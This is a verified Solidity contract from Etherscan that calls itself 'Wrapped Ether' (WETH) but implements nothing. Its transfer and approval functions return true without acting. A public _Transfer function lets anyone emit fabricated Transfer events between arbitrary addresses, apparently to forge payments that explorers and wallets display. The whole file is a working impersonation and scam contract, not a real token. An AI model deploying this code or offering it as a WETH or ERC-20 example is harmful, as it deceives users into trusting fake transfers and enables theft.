/**
 *Submitted for verification at Etherscan.io on 2023-08-07
*/

// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

contract WETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint256 public decimals = 18;
    uint256 private delay = 17;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    event Transfer(address from, address to, uint256 value);


     function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    

    function transfer(address to, uint256 value) public virtual returns (bool) {
        return true;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 value) public virtual returns (bool) {
        return true;
    }

    function _Transfer( address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        _Transfer(from, to, value);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        return true;
    }

    function decreaseAllowance(address spender, uint256 requestedDecrease) public virtual returns (bool) {
        return true;
    }

    
}